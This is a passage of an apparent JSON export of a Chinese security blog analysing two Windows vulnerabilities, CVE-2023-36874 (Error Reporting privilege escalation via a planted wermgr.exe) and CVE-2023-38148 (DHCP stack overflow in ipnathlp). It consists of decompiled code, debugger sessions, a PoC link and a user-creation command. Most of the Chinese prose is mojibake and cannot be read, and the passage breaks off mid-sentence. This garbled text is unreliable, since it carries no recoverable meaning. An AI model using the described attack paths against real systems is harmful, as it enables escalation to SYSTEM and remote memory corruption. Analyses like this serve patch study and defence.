OVERVIEW|COMæ¨¡å‹)ï¼ŒCOMæ¨¡å‹å®šä¹‰äº†äºŒè¿›åˆ¶æ ‡å‡†ï¼Œä»¥æ”¯æŒç»„ä»¶å¤ç”¨ã€‚å°†æ“ä½œç³»ç»ŸAPIæŠ½è±¡æˆäº†æ¥å£ï¼Œå¯ä»¥é€šè¿‡æ¥å£çš„æ ‡è¯†ç¬¦å®ä¾‹åŒ–COMå¯¹è±¡å¹¶é€šè¿‡COMå¯¹è±¡è°ƒç”¨æœåŠ¡æ¥å£ã€‚å³\nå½“ä½¿ç”¨COMæ¥å£è°ƒç”¨error reporting æœåŠ¡å¹¶æäº¤é”™è¯¯æŠ¥å‘Šæ—¶ï¼Œerror reportingä¼šå¯åŠ¨ C:\\Windows\\System32\\wermgr.exeï¼Œå¹¶ä¸”å¯åŠ¨æ—¶æƒé™ä¸º NT AUTHORITY\\SYSTEMã€‚ è¿½æº¯è°ƒç”¨æ ˆ æŸ¥çœ‹æ­¤äº‹ä»¶çš„è°ƒç”¨æ ˆï¼Œwer!WerpAuxmdMapFile+0x3887d å¤„è°ƒç”¨äº†CreateProcessW\nwer!WerpAuxmdMapFile+0x3887dä½äº UtilLaunchWerManagerå‡½æ•°å†…ï¼Œä»£ç å¦‚ä¸‹\n__int64 __fastcall UtilLaunchWerManager( const unsigned __int16 **a1, __int64 a2, __int64 a3, void *a4, void **a5, void **a6, unsigned int a7, void **a8) { .... WCHAR Buffer[264]; // [rsp+148h] [rbp+40h] BYREF v43 = -2i64; v39 = a1; v8 = a5; lpValue = a8; memset_0(Buffer, 0, 0x208ui64); lpCommandLine[0] = 0i64; lpCommandLine[1] = 0i64; ..... goto LABEL_67; } v11 = StringCchCatW(Buffer, 0x104ui64, L\u0026#34;\\\\wermgr.exe\u0026#34;); v12 = v11; if ( v11 \u0026gt;= 0 ) { v12 = CString::Sprintf((CString *)lpCommandLine, L\u0026#34;\\\u0026#34;%s\\\u0026#34; \u0026#34;, Buffer); if ( (v12 \u0026amp; 0x80000000) != 0 ) { if ( WPP_GLOBAL_Control != (HKEY)\u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; ((_BYTE)WPP_GLOBAL_Control[7] \u0026amp; 1) != 0 ) { WPP_SF_S(*((_QWORD *)WPP_GLOBAL_Control + 2), 20i64, \u0026amp;WPP_80b9a2815f1633611b5141c011dbf465_Traceguids, Buffer); goto LABEL_37; } goto LABEL_38; } v13 = 0; v14 = lpCommandLine[0]; while ( v13 \u0026lt; 0xE ) { ..... v19 = CString::Append((CString *)lpCommandLine, v40[0]); if ( v19 \u0026gt;= 0 || WPP_GLOBAL_Control == (HKEY)\u0026amp;WPP_GLOBAL_Control || ((_BYTE)WPP_GLOBAL_Control[7] \u0026amp; 1) == 0 ) { v14 = lpCommandLine[0]; } .... if ( UpdateProcThreadAttribute(v10, 0, 0x20002ui64, lpValue, 8i64 * a7, 0i64, 0i64) ) { StartupInfo.cb = 112; v45 = v10; if ( CreateProcessW(Buffer, v14, 0i64, 0i64, 2, 0x80000u, 0i64, 0i64, \u0026amp;StartupInfo, \u0026amp;hObject) ) { v12 = 0; } ...... } å‘ä¸Šè¿½æº¯è°ƒç”¨æ ˆï¼ŒUtilLaunchWerManagerå‡½æ•°ç”± CReportManager::ReportProblemOutOfProcessè°ƒç”¨ï¼Œ å†ä¸Šå±‚å‡½æ•°ä¸ºCReportManager::ReportProblemï¼ŒCReportManager::ReportProblemç”±ReportHandleInstance::SubmitReportè°ƒç”¨ï¼Œåœ¨ä¸Šå±‚å‡½æ•°ä¸ºWerpSubmitReportFromStoreã€‚åœ¨wecplsupport!DllCanUnloadNew+0x2bf2å¤„è°ƒç”¨äº†wer.dll!WerpSubmitReportFromStoreå‡½æ•°ã€‚\nwercplsupport!DllCanUnloadNew+0x2bf2å®é™…ä½äº wercplsupport!CWerComReport::_SubmitReportå‡½æ•°å†…ï¼Œä»£ç å¦‚ä¸‹ã€‚\n__int64 __fastcall CWerComReport::_SubmitReport( void **this, unsigned __int16 *a2, unsigned int a3, struct IUnknown *a4, unsigned __int16 **a5, unsigned int *a6) { ...... v24 = \u0026amp;CStubUI::`vftable\u0026#39;; if ( a4 ) ((void (__fastcall *)(struct IUnknown *))a4-\u0026gt;lpVtbl-\u0026gt;AddRef)(a4); v25 = a4; v23[0] = 0i64; TokenHandle = 0i64; v26 = 0; v10 = a5; if ( a5 ) { SysFreeString(*a5); *v10 = 0i64; } WerApiLock = CWerApiAutoLock::TryGetWerApiLock((CWerApiAutoLock *)v23, (struct CWerComReport *)this); if ( WerApiLock \u0026gt;= 0 ) { ..... } else { CurrentThread = GetCurrentThread(); if ( OpenThreadToken(CurrentThread, 0xF01FFu, 1, \u0026amp;TokenHandle) || GetLastError() == 1008 ) { ..... } else { WerApiLock = WerpSubmitReportFromStore( *((void **)this[5] + 4), a2, this[4], (struct IReportUI *)((unsigned __int64)\u0026amp;v24 \u0026amp; -(__int64)(a4 != 0i64)), \u0026amp;v21, a3, (enum _WER_SUBMIT_RESULT *)\u0026amp;v20); ..... } _SubmitReportç”± CWerComReport::SubmitReportè°ƒç”¨ï¼Œè€Œ CWerComReport::SubmitReportä¸ºIWerReportæ¥å£å…¬å¼€çš„å‡½æ•°ã€‚\n__int64 __fastcall CWerComReport::SubmitReport( CWerComReport *this, unsigned __int16 *a2, unsigned int a3, struct IWerReportSubmitCallback *a4, unsigned __int16 **a5, unsigned int *a6) { int v10; // ebx int v12; // [rsp+30h] [rbp-18h] BYREF __int64 v13; // [rsp+38h] [rbp-10h] v13 = -2i64; v12 = 2; if ( !CAutoImpersonate::g_bEnableImpersonate || (v10 = CAutoImpersonate::ImpersonateUserHighestPrivs((CAutoImpersonate *)\u0026amp;v12), v10 \u0026gt;= 0) ) { v10 = CWerComReport::_SubmitReport((CWerComReport *)((char *)this - 24), a2, a3, a4, a5, a6); } CAutoImpersonate::~CAutoImpersonate((CAutoImpersonate *)\u0026amp;v12); return (unsigned int)v10; } æ‰€ä»¥å¯ä»¥æ€»ç»“å‡ºè°ƒç”¨é“¾ï¼šwecplsupport!CWerComReport::SubmitReport-\u0026gt;wecplsupport!CWerComReport::_SubmitReport-\u0026gt;wer.dll!WerpSubmitReportFromStore...-\u0026gt;CreateProcessW\né—®é¢˜åœ¨äºåœ¨è°ƒç”¨CreateProcessWæ—¶ï¼ŒCreateProcessWä¼šä½¿ç”¨æ”»å‡»è€…è®¾ç½®çš„æ–‡ä»¶é‡å®šå‘ï¼Œä½†å°†ä½¿ç”¨è°ƒç”¨CreateProcessWçš„è¿›ç¨‹çš„security tokenè®¾ç½®è¿›ç¨‹çš„contextï¼Œè€Œä¸æ˜¯æ¨¡æ‹Ÿtokenæ¥è®¾ç½®è¿›ç¨‹çš„security contextã€‚\nä¹Ÿå°±æ˜¯æ”»å‡»è€…å¯ä»¥é€šè¿‡æ–‡ä»¶é‡å®šå‘å°† C:\\Windows\\System32é‡å®šå‘åˆ°æ”»å‡»è€…å¯æ§ç›®å½•ï¼Œå¹¶ä¸”åœ¨å¯æ§ç›®å½•å†™å…¥æ¶æ„ wermgr.exeï¼Œå½“è§¦å‘CreateProcessWæ—¶ï¼ŒCreateProcessWå°†ä½¿ç”¨æ”»å‡»è€…æ§åˆ¶çš„ç›®å½•çš„wermgr.exeæ–‡ä»¶è€Œä¸æ˜¯ç³»ç»Ÿåœ¨C:\\Windows\\System32ç›®å½•ä¸‹çš„wermgr.exeæ–‡ä»¶ã€‚å¹¶ä¸”è¯¥è¿›ç¨‹ä¸Šä¸‹æ–‡ç»§æ‰¿äº†è°ƒç”¨è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ï¼Œå³ç»§æ‰¿äº†weræœåŠ¡çš„æƒé™ã€‚\nåŠ¨æ€è°ƒè¯• åœ¨ UtilLaunchWerManageræ–­ç‚¹\nbp wer!UtilLaunchWerManager è°ƒè¯•å™¨æ–­ä¸‹\n0:006\u0026gt; g Breakpoint 2 hit wer!UtilLaunchWerManager+0xf3: 00007ffb`7b11a23f e87cb3f7ff call wer!StringCchCatW (00007ffb`7b0955c0) 0:006\u0026gt; rrcx rcx=00000041e2efbce0 è¡¥ä¸åˆ†æ å‰é¢çŸ¥é“è¡¥ä¸ç›´æ¥é˜»æ–­äº†åç»­è°ƒç”¨_submitï¼Œä¹Ÿå°±æ²¡åŠæ³•å†è°ƒç”¨CreateProcessï¼Œä»è€Œé˜»æ–­äº†è°ƒç”¨é“¾ã€‚\nPoC\nhttps://github.com/Wh04m1001/CVE-2023-36874 éœ€è¦æ³¨æ„çš„æ˜¯è¿è¡Œpocéœ€è¦ä½¿ç”¨ä¸åœ¨adminç»„çš„ç”¨æˆ·ï¼Œæ–°å¢ç”¨æˆ·è¿è¡Œ\nnet user test 123456 /add å‚è€ƒé“¾æ¥\nhttps://www.crowdstrike.com/blog/falcon-complete-zero-day-exploit-cve-2023-36874/\nCreated at 2023-09-19T10:26:14+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-38148-windows-ics-rce/","title":"CVE-2023-38148 Windows Ics Rceåˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ ä¾èµ–äºICSæœåŠ¡ï¼ŒInternet Connect Sharingï¼Œå¯¹åº”æ³¨å†Œè¡¨ï¼Œä¾èµ–ipnathlp.dll\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess æ¼æ´å­˜åœ¨äºå¤„ç†DHCPè¯·æ±‚æ—¶ï¼Œç”±äºæ²¡æœ‰æ£€æŸ¥è¾¹ç•Œï¼Œå¯¼è‡´åœ¨ä½¿ç”¨memsetæ—¶ä½¿ç”¨çš„é•¿åº¦å‚æ•°æ¥æºäºæ•°æ®åŒ…å†…ï¼Œå¯ä»¥å¯¼è‡´æ ˆæº¢å‡ºã€‚ æœåŠ¡è°ƒè¯•å‚è€ƒç¬¬äºŒä¸ªå‚è€ƒé“¾æ¥ã€‚\nå½±å“ç‰ˆæœ¬ ç•¥\nç¯å¢ƒæ­å»º å‚è€ƒ https://github.com/ruijanlee/h3cc/blob/master/h3cc_ruijanlee/doc/c8.md ï¼ŒåŒæ—¶åŠ ä¸€ä¸ªLinuxï¼Œç½‘å¡ä½¿ç”¨ç¬¬äºŒä¸ªç½‘å¡ï¼Œä½¿å¾—Linuxå‘å‡ºçš„DHCPåŒ…èƒ½å¤Ÿè¢«Windowsæ¥æ”¶åˆ°ã€‚\næŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• é™æ€åˆ†æ å¯¹æ¯”è¡¥ä¸ä¿®å¤å‰åçš„é€»è¾‘ï¼Œæœ‰ä¸¤ä¸ªæ˜æ˜¾çš„ä¸åŒç‚¹ï¼Œæœ‰ä¸¤ç§äº§ç”Ÿæ¼æ´çš„å¯èƒ½çš„åœ°æ–¹ã€‚\nåœ¨ä¿®å¤ç‰ˆæœ¬ä¸­åœ¨è¿›è¡Œ if ( *((_BYTE *)a2 + 230) \u0026gt; 0x20u )åˆ¤æ–­ä¹‹å‰å…ˆè°ƒç”¨äº† DumpDhcpHeaderInfoï¼Œåœ¨æ¼æ´ä»£ç ä¸­å…ˆè¿›è¡Œåˆ¤æ–­åœ¨è°ƒç”¨DumpDhcpHeaderInfo åœ¨ä¿®å¤ç‰ˆæœ¬ä¸­å¦‚æœæ»¡è¶³ if ( *((_BYTE *)a2 + 230) \u0026gt; 0x20u ) åˆ™è¿›å…¥ifå†…ï¼Œåœ¨ç»“æŸifè¯­å¥æ—¶ä¼šé€šè¿‡è·³è½¬ç•¥è¿‡ä¸€éƒ¨åˆ†å¤„ç†é€»è¾‘ï¼Œè€Œåœ¨æœªä¿®å¤ç‰ˆæœ¬å†…åˆ™è¿˜ä¼šç»§ç»­å¤„ç†ã€‚ å¯ä»¥çœ‹å‡º a2 + 230ä¸º_NH_BUFFER ç»“æ„ä½“å†…çš„æŸä¸ªé•¿åº¦å­—æ®µï¼Œè¯¥å¤„ä¸ºåˆ¤æ–­è¿™ä¸ªé•¿åº¦å­—æ®µå­˜å‚¨çš„é•¿åº¦ï¼Œè¯¥æ¼æ´åº”è¯¥æ˜¯æº¢å‡ºæ¼æ´ï¼Œå¹¶ä¸”åœ¨äº§ç”Ÿæ¼æ´çš„åœ°æ–¹éœ€è¦è¯»å–è¯¥å­—æ®µã€‚\næ‰€ä»¥æ¼æ´åº”è¯¥æ˜¯ç¬¬äºŒç‚¹æ‰€è¯´çš„ï¼Œäº§ç”Ÿåœ¨ç•¥è¿‡çš„é€»è¾‘ä¸­ã€‚\n// æœªä¿®å¤ä»£ç  void __fastcall DhcpProcessMessage(struct _DHCP_INTERFACE *a1, struct _NH_BUFFER *a2) { ...... memset_0(\u0026amp;v12, 0, 0x40ui64); if ( *((_BYTE *)a2 + 230) \u0026gt; 0x20u ) { if ( v4 != (CInterfaceMonitor *)\u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; (*((_BYTE *)v4 + 28) \u0026amp; 2) != 0 \u0026amp;\u0026amp; *((_BYTE *)v4 + 25) \u0026gt;= 4u ) WPP_SF_dD( *((_QWORD *)v4 + 2), 97i64, \u0026amp;WPP_2a3aeb8dd77c3a1919c551579bb6cf5d_Traceguids, *((unsigned __int8 *)a2 + 230), 32); _InterlockedIncrement((volatile signed __int32 *)\u0026amp;DhcpStatistics); } DumpDhcpHeaderInfo(a2); // ä¿®å¤ä»£ç  void __fastcall DhcpProcessMessage(struct _DHCP_INTERFACE *a1, struct _NH_BUFFER *a2) { ...... memset_0(\u0026amp;v11, 0, 0x40ui64); DumpDhcpHeaderInfo(a2); if ( *((_BYTE *)a2 + 230) \u0026gt; 0x20u ) { if ( WPP_GLOBAL_Control != (CInterfaceMonitor *)\u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; (*((_BYTE *)WPP_GLOBAL_Control + 28) \u0026amp; 2) != 0 \u0026amp;\u0026amp; *((_BYTE *)WPP_GLOBAL_Control + 25) \u0026gt;= 4u ) { WPP_SF_dd( *((_QWORD *)WPP_GLOBAL_Control + 2), 97i64, \u0026amp;WPP_df007ca3347434f5610fc5a17e95e0a3_Traceguids, *((unsigned __int8 *)a2 + 230), 32); } goto LABEL_10; } LABEL_10: _InterlockedIncrement((volatile signed __int32 *)\u0026amp;DhcpStatistics);// è¿™é‡Œå¤šäº†è°ƒç”¨ goto LABEL_11; ...... LABEL_11: EnterCriticalSection(\u0026amp;DhcpInterfaceLock); if ( *((int *)a1 + 19) \u0026lt; 0 ) { LeaveCriticalSection(\u0026amp;DhcpInterfaceLock); ç•¥è¿‡çš„ä»£ç ä¸­ï¼Œè¯»å–äº†a2å‚æ•°çš„ä»£ç å¦‚ä¸‹ï¼š\nif ( DhcpExtractOptionsFromMessage((struct _NH_BUFFER *)((char *)a2 + 228), *((_DWORD *)a2 + 55), \u0026amp;v11) ) ..... if ( !v12 ) { ..... DhcpProcessBootpMessage(a1, a2, \u0026amp;v11); goto LABEL_11; } ..... if ( DhcpIsLocalHardwareAddress((unsigned __int8 *)a2 + 256, *((unsigned __int8 *)a2 + 230)) ) { .... } v7 = *(unsigned __int8 *)(v12 + 2); if ( v7 == 1 ) { ..... DhcpProcessDiscoverMessage(a1, a2, \u0026amp;v11); } else if ( *(_BYTE *)(v12 + 2) == 3 ) { ...... DhcpProcessRequestMessage(a1, a2, \u0026amp;v11); } ...... } if ( !DhcpArpForDad ) { v10 = *(_DWORD *)(v13 + 2); DhcpRemoveArpEntry(v10); DhcpCancelLease(v10, (unsigned __int8 *)a2 + 256, *((unsigned __int8 *)a2 + 230)); ..... } else { if ( *(_BYTE *)(v12 + 2) != 7 ) { if ( *(_BYTE *)(v12 + 2) == 8 ) { ...... DhcpProcessInformMessage(a1, a2, \u0026amp;v11); } else { ...... } goto LABEL_11; } if ( !DhcpArpForDad ) { DhcpRemoveArpEntry(*((_DWORD *)a2 + 60)); DhcpCancelLease(*((_DWORD *)a2 + 60), (unsigned __int8 *)a2 + 256, *((unsigned __int8 *)a2 + 230)); } ...... } æŸ¥çœ‹è¿™äº›å‡½æ•°ä»£ç ï¼Œåœ¨ DhcpProcessBootpMessageå‡½æ•°ä¸­æœ‰å¦‚ä¸‹é€»è¾‘\nvoid __fastcall DhcpProcessBootpMessage( v3 = a2; v5 = (char *)v3 + 228; ...... else { if ( !DhcpSendUnicastMessagesEnabled || v5[10] \u0026lt; 0 || DhcpAddArpEntry(v6, (unsigned __int8 *)v5 + 28, (unsigned __int8)v5[2], v23) )// è¿™ä¸ªå‡½æ•°è§¦å‘äº†æ¼æ´ { // movzx r8d, byte ptr [r15+2] ; Size ... å‰é¢çŸ¥é“ a2 + 230æ˜¯é•¿åº¦å­—æ®µï¼Œv5=v2+228ï¼Œä¼ å…¥ DhcpAddArpEntryçš„sizeå‚æ•°ä¸ºv5+2ï¼Œä¹Ÿå°±æ˜¯a2 + 230 åœ¨ DhcpAddArpEntryå‡½æ•°ä¸­ï¼ŒRowä¸ºæ ˆå†…ç»“æ„ä½“ï¼Œmemcpyä¼ å…¥çš„é•¿åº¦å‚æ•°ä¸ºa2 + 230ï¼Œä¹Ÿå°±æ˜¯è¡¥ä¸ä¸­åˆ¤æ–­çš„é•¿åº¦å‚æ•°ã€‚ MIB_IPNET_ROW2ç»“æ„ä½“å®šä¹‰å¯ä»¥åœ¨\rè¿™æ‰¾åˆ°ï¼Œå…¶å¤§å°ä¸º0x58\n__int64 __fastcall DhcpAddArpEntry(DWORD a1, unsigned __int8 *Src, size_t Size, struct _DHCP_INTERFACE *a4) { MIB_IPNET_ROW2 Row; ...... v4 = (unsigned int)Size; ..... memset_0(\u0026amp;Row, 0, sizeof(Row)); Row.InterfaceIndex = DhcpAdapterIndex; Row.Address.Ipv4.sin_family = 2; Row.Address.Ipv4.sin_addr.S_un.S_addr = a1; Row.PhysicalAddressLength = v4; memcpy_0(Row.PhysicalAddress, Src, v4); ...... return v11; } } æ‰€ä»¥æ¼æ´è§¦å‘è·¯å¾„ä¸º DhcpProcessMessage-\u0026gt;DhcpProcessBootpMessage-\u0026gt;DhcpAddArpEntry-\u0026gt;memcpy_0ï¼Œå½“é•¿åº¦å‚æ•°è¿‡é•¿æ—¶å¯ä»¥åˆ©ç”¨memcpyè§¦å‘æ ˆæº¢å‡ºã€‚\nåŠ¨æ€è°ƒè¯• ä½¿ç”¨windbgé™„åŠ åˆ°svchostè¿›ç¨‹ï¼Œåœ¨ ipnathlp!DhcpProcessMessageæ–­ç‚¹ï¼Œè€Œåè§¦å‘DHCPè¯·æ±‚ï¼Œwindbgåœ¨ ipnathlp!DhcpProcessMessageæ–­ä¸‹ ç”±äºä¸çŸ¥é“ DhcpProcessMessageçš„a2ç»“æ„ä½“å®šä¹‰ï¼Œæ­¤å¤„æ„é€ æ­£å¸¸çš„DHCPè¯·æ±‚ï¼Œå¹¶åœ¨è°ƒè¯•å™¨ä¸­æŸ¥çœ‹è¿™ä¸ªç»“æ„ä½“æˆå‘˜ä¿¡æ¯ã€‚ å•æ­¥è¿è¡Œåˆ°åˆ¤æ–­é•¿åº¦çš„åœ°æ–¹ï¼Œæ­¤æ—¶rsiæŒ‡å‘ä¼ å…¥çš„ _NH_BUFFERç»“æ„ä½“ï¼Œ\n0:004\u0026gt; u ipnathlp!DhcpProcessMessage+0x7f: 00007ff9`c00176f3 488dbee4000000 lea rdi,[rsi+0E4h] 00007ff9`c00176fa 41b604 mov r14b,4 00007ff9`c00176fd 807f0220 cmp byte ptr [rdi+2],20h 00007ff9`c0017701 7636 jbe ipnathlp!DhcpProcessMessage+0xc5 (00007ff9`c0017739) 00007ff9`c0017703 493bdc cmp rbx,r12 00007ff9`c0017706 742a je ipnathlp!DhcpProcessMessage+0xbe (00007ff9`c0017732) 00007ff9`c0017708 44847b1c test byte ptr [rbx+1Ch],r15b 00007ff9`c001770c 7424 je ipnathlp!DhcpProcessMessage+0xbe (00007ff9`c0017732) å¯ä»¥åœ¨è°ƒè¯•å™¨å†…çœ‹åˆ° (_BYTE *)a2 + 230)å€¼ä¸º6\n0:004\u0026gt; db rdi+2 00000203`faa1fdb6 06 00 1a cc 8a 61 00 00-80 00 00 00 00 00 00 00 .....a.......... 00000203`faa1fdc6 00 00 00 00 00 00 00 00-00 00 00 0c 29 c2 3a 42 ............).:B 00000203`faa1fdd6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fde6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fdf6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe06 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe16 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe26 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ è€Œè¯¥å¤„æ•°æ®æ¥æºäºDHCPå®¢æˆ·ç«¯å‘é€çš„DHCPè¯·æ±‚ï¼Œåœ¨wiresharkä¸­å¯ä»¥çœ‹åˆ°æ•°æ®åŒ…ä¸­åˆšå¥½æœ‰é•¿åº¦å­—æ®µå€¼ä¸º6ï¼Œè¯´æ˜(_BYTE *)a2 + 230)å¤„æœ‰å¯èƒ½æ˜¯æ•°æ®åŒ…å†…çš„Hardware address lengthã€‚\næ­¤æ—¶è°ƒç”¨æ ˆï¼š\n0:004\u0026gt; k Child-SP RetAddr Call Site 0000000e`3487f480 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0x86 0000000e`3487f540 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644 0000000e`3487f5a0 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f 0000000e`3487f5d0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca 0000000e`3487f610 00007ff9`ee0a7614 ntdll!TppWorkerThread+0x456 0000000e`3487f910 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14 0000000e`3487f940 00000000`00000000 ntdll!RtlUserThreadStart+0x21 æ­¤æ—¶å°è¯•æ‰‹åŠ¨å°†(_BYTE *)a2 + 230)ä¿®æ”¹ä¸º0xfeï¼Œç»§ç»­è¿è¡Œï¼Œä½†æ²¡æœ‰è§¦å‘å¼‚å¸¸ã€‚\n0:004\u0026gt; db rdi+2 00000203`faa1fdb6 06 00 1a cc 8a 61 00 00-80 00 00 00 00 00 00 00 .....a.......... 00000203`faa1fdc6 00 00 00 00 00 00 00 00-00 00 00 0c 29 c2 3a 42 ............).:B 00000203`faa1fdd6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fde6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fdf6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe06 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe16 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe26 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 0:004\u0026gt; eb rdi+2 fe 0:004\u0026gt; db rdi+2 00000203`faa1fdb6 fe 00 1a cc 8a 61 00 00-80 00 00 00 00 00 00 00 .....a.......... 00000203`faa1fdc6 00 00 00 00 00 00 00 00-00 00 00 0c 29 c2 3a 42 ............).:B 00000203`faa1fdd6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fde6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fdf6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe06 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe16 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe26 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 0:002\u0026gt; g Breakpoint 0 hit ipnathlp!DhcpProcessMessage: 00007ff9`c0017674 48895c2418 mov qword ptr [rsp+18h],rbx ss:0000000e`346ff630=00000203faa7e350 æ”¹ä¸ºå•æ­¥è°ƒè¯•ï¼Œå†æ¬¡å‘èµ·DHCPè¯·æ±‚ï¼Œå‘ç°æ²¡æœ‰è¿›å…¥åˆ°æ¼æ´å‡½æ•° DhcpProcessBootpMessageä¸­ï¼ŒåŸå› æ˜¯v13ä¸ä¸º0ï¼Œæ¡ä»¶ä¸æˆç«‹ï¼Œä¸ä¼šè°ƒç”¨ DhcpProcessBootpMessage\nif ( !v13 ) { if ( WPP_GLOBAL_Control != (CInterfaceMonitor *)\u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; (*((_BYTE *)WPP_GLOBAL_Control + 28) \u0026amp; 2) != 0 \u0026amp;\u0026amp; *((_BYTE *)WPP_GLOBAL_Control + 25) \u0026gt;= 4u ) { WPP_SF_(*((_QWORD *)WPP_GLOBAL_Control + 2), 98i64, \u0026amp;WPP_2a3aeb8dd77c3a1919c551579bb6cf5d_Traceguids); } DhcpProcessBootpMessage(a1, a2, \u0026amp;v12); // è¿™é‡Œè§¦å‘æ¼æ´ goto LABEL_25; } å¯¹v13ä¸‹å†™æ–­ç‚¹\n0:004\u0026gt; ba w1 rsp+0x38 0:004\u0026gt; g Breakpoint 6 hit msvcrt!memset+0x35: 00007ff9`ed1046b5 4983e908 sub r9,8 è§¦å‘æ–­ç‚¹ï¼Œæ­¤æ—¶è°ƒç”¨æ ˆå¦‚ä¸‹ï¼Œå¯¹åº”ä»£ç ä¸º memset_0(a3, 0, 0x40ui64);\n0:004\u0026gt; k Child-SP RetAddr Call Site 0000000e`3487f418 00007ff9`c0015b63 msvcrt!memset+0x35 0000000e`3487f420 00007ff9`c0017754 ipnathlp!DhcpExtractOptionsFromMessage+0x7b 0000000e`3487f480 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0xe0 0000000e`3487f540 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644 0000000e`3487f5a0 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f 0000000e`3487f5d0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca 0000000e`3487f610 00007ff9`ee0a7614 ntdll!TppWorkerThread+0x456 0000000e`3487f910 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14 0000000e`3487f940 00000000`00000000 ntdll!RtlUserThreadStart+0x21 æ­¤å¤„å°†ç›®æ ‡å†…å­˜æ¸…é›¶ï¼Œä¸ç¬¦åˆå‰é¢è¯´çš„æ¡ä»¶ï¼Œç»§ç»­è¿è¡Œï¼Œå†æ¬¡è§¦å‘å†™æ–­ï¼Œè°ƒç”¨æ ˆä¸º\n0:004\u0026gt; k Child-SP RetAddr Call Site 0000000e`3487f420 00007ff9`c0017754 ipnathlp!DhcpExtractOptionsFromMessage+0x428 0000000e`3487f480 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0xe0 0000000e`3487f540 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644 0000000e`3487f5a0 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f 0000000e`3487f5d0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca 0000000e`3487f610 00007ff9`ee0a7614 ntdll!TppWorkerThread+0x456 0000000e`3487f910 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14 0000000e`3487f940 00000000`00000000 ntdll!RtlUserThreadStart+0x21 å¯¹åº”åœ¨DhcpExtractOptionsFromMessageçš„ä»£ç å¦‚ä¸‹ï¼Œå½“OptionIDä¸º0x35æ—¶è¿›å…¥caseè¯­å¥å†…\nv9 = (struct _DHCP_OPTION *)((char *)a1 + 240); OptionID = v9-\u0026gt;OptionID; if ( OptionID ) { switch ( OptionID ) case 0x35u: if ( v6 != (CInterfaceMonitor *)\u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; (*((_BYTE *)v6 + 28) \u0026amp; 2) != 0 \u0026amp;\u0026amp; *((_BYTE *)v6 + 25) \u0026gt;= 4u ) { WPP_SF_(*((_QWORD *)v6 + 2), 44i64, \u0026amp;WPP_2a3aeb8dd77c3a1919c551579bb6cf5d_Traceguids); v6 = WPP_GLOBAL_Control; } if ( BYTE1(v9-\u0026gt;OptionID) ) { a3[1] = v9; } _DHCP_OPTIONç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼Œå¯¹åº”äºDHCPè¯·æ±‚å†…çš„option\ntypedef DWORD DHCP_OPTION_ID; struct _DHCP_OPTION { DHCP_OPTION_ID OptionID; LPWSTR OptionName; LPWSTR OptionComment; DHCP_OPTION_DATA DefaultValue; DHCP_OPTION_TYPE OptionType; }; 0:002\u0026gt; db rdi 00000203`faa1fea4 35 01 03 3d 07 01 00 0c-29 c2 3a 42 32 04 c0 a8 5..=....).:B2... 00000203`faa1feb4 89 cd 0c 0f 44 45 53 4b-54 4f 50 2d 54 35 50 37 ....DESKTOP-T5P7 00000203`faa1fec4 34 45 53 51 12 00 00 00-44 45 53 4b 54 4f 50 2d 4ESQ....DESKTOP- 00000203`faa1fed4 54 35 50 37 34 45 53 3c-08 4d 53 46 54 20 35 2e T5P74ES\u0026lt;.MSFT 5. 00000203`faa1fee4 30 37 0e 01 03 06 0f 1f-21 2b 2c 2e 2f 77 79 f9 07......!+,./wy. æ ¹æ®RFC rfc2132 option 53ä¸ºä¼ 